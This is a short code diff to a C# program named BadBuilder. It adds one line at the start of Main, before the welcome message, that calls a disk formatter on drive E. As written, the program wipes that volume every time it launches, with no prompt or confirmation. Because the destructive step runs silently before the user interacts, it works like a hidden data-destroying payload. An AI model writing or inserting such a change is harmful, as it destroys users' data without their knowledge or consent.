@@ -26,6 +26,7 @@ namespace BadBuilder
 
         static void Main(string[] args)
         {
+            BadBuilder.Formatter.DiskFormatter.FormatVolume('E');
             ShowWelcomeMessage();
 
             while (true)
